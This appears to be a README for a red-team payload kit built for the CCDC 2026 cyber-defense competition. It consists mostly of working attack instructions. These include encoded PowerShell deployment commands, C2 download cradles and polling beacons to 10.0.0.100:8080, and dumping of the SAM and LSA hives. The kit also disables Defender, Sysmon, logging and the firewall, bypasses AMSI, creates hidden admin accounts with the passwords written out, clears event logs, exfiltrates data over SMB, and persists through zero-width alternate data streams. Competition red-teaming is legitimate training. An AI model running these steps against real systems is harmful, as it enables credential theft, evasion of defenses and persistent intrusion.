# Competition Package - CCDC 2026

This directory contains pre-built payload combinations and deployment commands for CCDC Finals 2026 competition infrastructure.

## Quick Start

### 1. Generate All Deployment Packages
```bash
cd /home/kali/Desktop/apparition/Apparition-Delivery-System
bash competition/generate-all-deployments.sh
```

This creates 7 deployment files in `competition/deployments/`:
- `dc-primary.txt` - Domain Controller primary payload (defense evasion + cred dump + C2)
- `dc-secondary.txt` - Domain Controller secondary payload (recon + lateral prep + hidden admin)
- `server-primary.txt` - Server primary payload (firewall + C2 + service disruption)
- `server-secondary.txt` - Server secondary payload (RDP + admin + lateral prep)
- `workstation-primary.txt` - Workstation primary payload (C2 + cred dump + quick wins)
- `workstation-secondary.txt` - Workstation secondary payload (recon + admin + exfil)
- `fallback.txt` - Emergency fallback (unencrypted, maximum speed)

### 2. Start Attack Infrastructure
```bash
# HTTP server for C2 beacons
cd /path/to/your/c2/tools
python3 -m http.server 8080

# Responder for NTLM hash capture (optional)
sudo responder -I eth0
```

### 3. Deploy to Targets

Open the appropriate deployment file from `competition/deployments/`, copy the base64 one-liner, and paste into PowerShell on the Windows target.

**Example:**
```powershell
# On Windows target (as Administrator or SYSTEM)
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <long_base64_string_here>
```

## Directory Structure

```
competition/
├── README.md                           # This file
├── DEPLOYMENT-GUIDE.md                 # Comprehensive deployment guide
├── QUICK-REFERENCE.md                  # One-page reference card
├── generate-all-deployments.sh         # Script to generate all deployment packages
├── payloads/                           # Source payload files
│   ├── dc-primary.ps1                  # DC primary payload (defense evasion + cred dump + C2)
│   ├── dc-secondary.ps1                # DC secondary payload (recon + lateral prep)
│   ├── server-primary.ps1              # Server primary payload (firewall + C2 + services)
│   ├── server-secondary.ps1            # Server secondary payload (RDP + admin + lateral)
│   ├── workstation-primary.ps1         # Workstation primary payload (C2 + creds + defense)
│   └── workstation-secondary.ps1       # Workstation secondary payload (recon + admin + exfil)
└── deployments/                        # Generated deployment files (created by script)
    ├── dc-primary.txt
    ├── dc-secondary.txt
    ├── server-primary.txt
    ├── server-secondary.txt
    ├── workstation-primary.txt
    ├── workstation-secondary.txt
    ├── fallback.txt
    └── manifests/                      # JSON manifests for cleanup
        ├── manifest-<timestamp>.json
        └── ...
```

## Payload Selection Guide

### Domain Controllers (Tier 1 - Highest Value)

**Primary Objective:** Maximum stealth credential access + C2 beacon

**dc-primary.ps1:**
- Disable PowerShell Script Block Logging + Module Logging
- Add Defender exclusions (C:\ProgramData, TEMP dirs)
- Disable Defender tamper protection (registry workaround)
- Dump SAM + SYSTEM + SECURITY hives (full LSA secrets)
- Timestomp credential dumps (anti-forensics)
- C2 beacon: download cradle from 10.0.0.100:8080/agent.ps1
- Stealthy firewall manipulation (allow-all rule, firewall stays "on")
- Disable + unload Sysmon driver

**dc-secondary.ps1:**
- Domain enumeration (DCs, domain admins, forest topology)
- Full system + network reconnaissance
- Scheduled task enumeration (blue team hunting)
- Create hidden admin: svcUpdate / Pa$$w0rd2026! (hidden from login screen)
- Enable WinRM + PSRemoting (trusted hosts = wildcard)
- Enable WMI remote access
- Enable RDP with NLA disabled (easier red team access)

**Deployment:**
```bash
pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/dc-primary.ps1 \
  -Encrypt -Randomize -ZeroWidthStreams -UseDeepPlacement -AttachToExisting \
  -CreateDecoys 3 -InstanceCount 3 -OutputFile competition/deployments/dc-primary.txt
```

**Stealth Features:**
- AES-256 encryption with hardware-derived keys
- Zero-width Unicode stream names (invisible to casual inspection)
- Deep placement in WER/Cache directories
- Attach to existing files when possible
- 3 decoy streams per instance (Zone.Identifier, Summary, Comments)
- 3 independent instances (multiple fallback paths)

---

### Windows Servers (Tier 2 - Sustained Access)

**Primary Objective:** Reliable C2 + service disruption

**server-primary.ps1:**
- Aggressive firewall disable (netsh + service disable for persistence)
- Dual C2 beacons:
  - Download cradle from 10.0.0.100:8080/agent.ps1
  - Polling beacon to 10.0.0.100:8080/tasks (5-minute interval)
- Service disruption:
  - Stop + disable Windows Defender
  - Disable Defender real-time monitoring (policy registry)
  - Stop + disable Windows Update (wuauserv + UsoSvc)
  - Disable Sysmon
- Defense evasion: disable PowerShell Script Block + Module Logging

**server-secondary.ps1:**
- RDP enablement + port opening
- Open ports: 3389, 5985, 5986, 445 (disguised as "Core Networking - DHCP")
- Dual admin creation:
  - svcAdmin / Pa$$w0rd2026! (new local admin)
  - Administrator / Adm1nCCDC2026! (re-enable built-in admin)
- Lateral movement prep:
  - Enable WinRM
  - Create SMB share: \\TARGET\RedTeam (Everyone full access)
- Full system reconnaissance
- Credential dump (SAM + SYSTEM)

**Deployment:**
```bash
pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/server-primary.ps1 \
  -Encrypt -Randomize -InstanceCount 2 -OutputFile competition/deployments/server-primary.txt
```

**Stealth Features:**
- AES-256 encryption
- Randomized stream names
- 2 independent instances per server
- JScript wrapper for Task Scheduler (Session 0 invisible execution)

---

### Workstations (Tier 3 - Quick Wins)

**Primary Objective:** Fast compromise + credential harvesting

**workstation-primary.ps1:**
- C2 beacon: download cradle from 10.0.0.100:8080/agent.ps1
- Fast firewall disable (netsh)
- Credential dump (SAM + SYSTEM)
- Defense evasion:
  - Add Defender exclusions
  - Disable PowerShell logging
  - Disable Sysmon
- Quick reconnaissance

**workstation-secondary.ps1:**
- Full reconnaissance + interesting file search
- Create admin: svcAdmin / Pa$$w0rd2026!
- Enable RDP
- Clear all event logs (noisy but effective)
- Compress user data: C:\ProgramData\backup.zip (Documents + Desktop)

**Deployment:**
```bash
pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/workstation-primary.ps1 \
  -Encrypt -Randomize -OutputFile competition/deployments/workstation-primary.txt
```

**Stealth Features:**
- AES-256 encryption
- Randomized stream names
- Single instance (optimized for speed)
- JScript wrapper for Task Scheduler

---

## Deployment Timing

| Target Type | Deployment Command | Estimated Time | Instances | Stealth Level |
|-------------|-------------------|----------------|-----------|---------------|
| **Domain Controller** | dc-primary.txt | 25-35 seconds | 3 | Very High |
| **Domain Controller** | dc-secondary.txt | 25-35 seconds | 3 | Very High |
| **Server** | server-primary.txt | 12-18 seconds | 2 | High |
| **Server** | server-secondary.txt | 12-18 seconds | 2 | High |
| **Workstation** | workstation-primary.txt | 6-10 seconds | 1 | Medium |
| **Workstation** | workstation-secondary.txt | 6-10 seconds | 1 | Medium |
| **Fallback** | fallback.txt | 3-5 seconds | 1 | Low |

## Attack Infrastructure Requirements

### HTTP Server (10.0.0.100:8080)

**Required endpoints:**

1. `/agent.ps1` - C2 agent script (downloaded by beacons)
2. `/tasks` - Tasking endpoint (polled by server-primary beacons every 5 min)
   - Return empty response for no-op
   - Return PowerShell script for tasking

**Setup:**
```bash
# Simple HTTP server
cd /path/to/c2/tools
python3 -m http.server 8080

# Or use a proper C2 framework (Empire, Covenant, etc.)
```

### Optional: NTLM Capture (Responder)

If deploying CRED-005 payloads (not included in default packages):
```bash
sudo responder -I eth0
```

### Optional: SMB Server for Exfil

```bash
# Impacket smbserver
impacket-smbserver share /tmp/exfil -smb2support
```

## Post-Deployment Actions

### 1. Verify Persistence

```powershell
# Check scheduled tasks
Get-ScheduledTask | Where-Object { $_.TaskName -like 'WinSAT_*' }

# Check ADS presence (requires manifest stream name)
$sn='<from_manifest_StreamNameEscaped>'
Test-Path "C:\ProgramData\<file>:$sn"

# Check task execution history
Get-ScheduledTask -TaskName 'WinSAT_*' | Get-ScheduledTaskInfo
```

### 2. Collect Artifacts

**Credential dumps:**
```bash
# Download via SMB (using created admin account)
smbclient //10.0.0.50/C$ -U svcAdmin%'Pa$$w0rd2026!' \
  -c 'cd ProgramData; get s.dat; get sy.dat; get se.dat'

# Crack hashes offline
secretsdump.py -sam s.dat -system sy.dat -security se.dat LOCAL
```

**Reconnaissance files:**
```bash
smbclient //10.0.0.50/C$ -U svcAdmin%'Pa$$w0rd2026!' \
  -c 'cd ProgramData; get r.txt; get d.txt; get t.txt; get f.txt; get backup.zip'
```

**Files created by payloads:**
- `C:\ProgramData\s.dat` - SAM hive
- `C:\ProgramData\sy.dat` - SYSTEM hive
- `C:\ProgramData\se.dat` - SECURITY hive (dc-primary only)
- `C:\ProgramData\r.txt` - System reconnaissance
- `C:\ProgramData\d.txt` - Domain enumeration (dc-secondary only)
- `C:\ProgramData\t.txt` - Scheduled tasks enumeration (dc-secondary only)
- `C:\ProgramData\f.txt` - Interesting files search (workstation-secondary only)
- `C:\ProgramData\backup.zip` - User data (workstation-secondary only)

### 3. Access Compromised Systems

**RDP:**
```bash
xfreerdp /v:TARGET /u:svcAdmin /p:'Pa$$w0rd2026!' /cert-ignore
```

**WinRM:**
```bash
evil-winrm -i TARGET -u svcAdmin -p 'Pa$$w0rd2026!'
```

**SMB:**
```bash
smbclient //TARGET/RedTeam -U svcAdmin%'Pa$$w0rd2026!'
```

**Created Accounts:**
- `svcAdmin` / `Pa$$w0rd2026!` - Local admin (servers, workstations)
- `svcUpdate` / `Pa$$w0rd2026!` - Hidden admin (DCs - not visible on login screen)
- `Administrator` / `Adm1nCCDC2026!` - Re-enabled built-in (servers)

## Cleanup Procedure

Each deployment generates a manifest in `competition/deployments/manifests/`. The manifest contains exact stream names (including zero-width codepoints for Tier 1 deployments).

**Generic cleanup template:**
```powershell
# Load manifest values
$hp='<HostPath_from_manifest>'
$sn=<StreamNameEscaped_from_manifest>  # e.g., [char]0x200B+[char]0x200C+...
$tn='<TaskName_from_manifest>'

# Remove ADS
Remove-Item "$hp`:$sn" -Force -ErrorAction SilentlyContinue

# Remove scheduled task
Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue

# Remove JScript wrapper (randomized filename - pattern match)
$_jsDir = Split-Path $hp -Parent
if ($_jsDir) {
    Get-ChildItem -Path $_jsDir -Filter "windiag_*.js" -ErrorAction SilentlyContinue | Remove-Item -Force
}

# Remove host file (ONLY if not attached to existing)
# Check manifest: if AttachToExisting = true, DO NOT remove host file
Remove-Item $hp -Force -ErrorAction SilentlyContinue

# Remove staged artifacts
Remove-Item C:\ProgramData\*.dat -Force -ErrorAction SilentlyContinue
Remove-Item C:\ProgramData\r.txt -Force -ErrorAction SilentlyContinue
Remove-Item C:\ProgramData\d.txt -Force -ErrorAction SilentlyContinue
Remove-Item C:\ProgramData\t.txt -Force -ErrorAction SilentlyContinue
Remove-Item C:\ProgramData\f.txt -Force -ErrorAction SilentlyContinue
Remove-Item C:\ProgramData\backup.zip -Force -ErrorAction SilentlyContinue

# Remove created accounts
net user svcAdmin /delete 2>nul
net user svcUpdate /delete 2>nul
# Re-disable built-in Administrator if you re-enabled it
net user Administrator /active:no 2>nul

# Remove registry modifications (SpecialAccounts)
Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name svcUpdate -ErrorAction SilentlyContinue

# Remove SMB share
net share RedTeam /delete 2>nul
```

## Operational Security

### Avoid These Common Mistakes

1. **Don't deploy SYSTEM-incompatible payloads from scheduled tasks:**
   - FUN-001 through FUN-006 (wallpaper, TTS, GUI-based)
   - CRED-003 (Chrome cookies - SYSTEM has no user profile)
   - NOVEL-002, NOVEL-004 (HKCU persistence - affects SYSTEM hive only)

2. **Don't lose manifests** - zero-width stream names cannot be reconstructed without codepoints

3. **Don't mix encrypted/unencrypted cleanup** - check manifest encryption status first

4. **Don't forget to start HTTP server** before deploying C2 beacons

### Blue Team Detection Indicators

**High-confidence indicators:**
- Scheduled tasks with WinSAT_* pattern
- JScript files in ProgramData/WER/Cache: `windiag_*.js`
- Service stop events for Sysmon/Defender
- Registry modifications to Windows Defender policies
- Outbound HTTP to 10.0.0.100:8080
- Credential dump artifacts (s.dat, sy.dat, se.dat) in C:\ProgramData

**Medium-confidence indicators:**
- New local admin accounts (svcAdmin, svcUpdate)
- RDP enablement on previously disabled systems
- Firewall disable events
- PowerShell Script Block Logging disable
- SMB shares named "RedTeam"

**Low-confidence indicators:**
- Generic recon commands (ipconfig, netstat, whoami)
- File reads in C:\ProgramData

## Troubleshooting

### Payload Won't Execute

**Symptoms:** No task created, no ADS written, no immediate output

**Fixes:**
1. Check AMSI bypass status (enabled by default in ADS-OneLiner.ps1)
2. Verify Defender real-time protection: `Get-MpComputerStatus`
3. Check PowerShell execution policy: `Get-ExecutionPolicy` (should be Bypass or Unrestricted)
4. Try Tier 4 fallback deployment (unencrypted, faster, fewer evasion features)
5. Verify running with elevated privileges: `whoami /priv`

### C2 Beacon Not Calling Home

**Symptoms:** No HTTP requests to 10.0.0.100:8080 in server logs

**Fixes:**
1. Verify HTTP server is running: `curl http://10.0.0.100:8080/agent.ps1`
2. Check firewall on attack box: `sudo ufw status`
3. Verify network connectivity from target: `Test-NetConnection 10.0.0.100 -Port 8080`
4. Check scheduled task is running: `Get-ScheduledTask -TaskName 'WinSAT_*' | Get-ScheduledTaskInfo`
5. Review task execution logs: `Get-WinEvent -LogName Microsoft-Windows-TaskScheduler/Operational -MaxEvents 20`

### Scheduled Task Fails to Create

**Symptoms:** Task not visible in `Get-ScheduledTask`, no persistence

**Fixes:**
1. Verify PowerShell version: `$PSVersionTable.PSVersion` (requires 5.1+)
2. Check SYSTEM privileges: `whoami` (should show `nt authority\system`)
3. Review Task Scheduler event logs for errors
4. Try registry persistence instead: use `-Persist registry` flag
5. Ensure JScript wrapper was created: check for `windiag_*.js` files

### ADS Not Found After Deployment

**Symptoms:** `Test-Path` returns false, stream not listed

**Fixes:**
1. Verify stream name reconstruction using manifest codepoints
2. Check host file exists: `Test-Path $hp`
3. List all streams on host file: `Get-Item $hp -Stream *`
4. Deep placement may have chosen different directory - check manifest HostPath
5. Attachment may have failed - check manifest AttachToExisting status

## Support Files

- `DEPLOYMENT-GUIDE.md` - Comprehensive deployment documentation
- `QUICK-REFERENCE.md` - One-page cheat sheet for competition
- `generate-all-deployments.sh` - Automated deployment package generation

## Legal and Ethical Notice

This competition package is created for authorized offensive security training and CCDC competition use only. See:
- `../docs/PROJECT-AUTHORIZATION.md` - Authorization framework
- `../docs/SAFETY-BOUNDARIES.md` - Ethical boundaries and scope

**All payloads must only be deployed against competition infrastructure with proper authorization.**

---

**Competition Package Version:** 1.0.0
**Target Event:** CCDC Finals 2026
**Attack Box:** 10.0.0.100:8080
**Payload Count:** 6 (primary + secondary for 3 target tiers)
**Total Deployment Options:** 7 (including fallback)
**AMSI Bypass:** XOR Fragment Splitting (automatic, Layer A + Layer B)
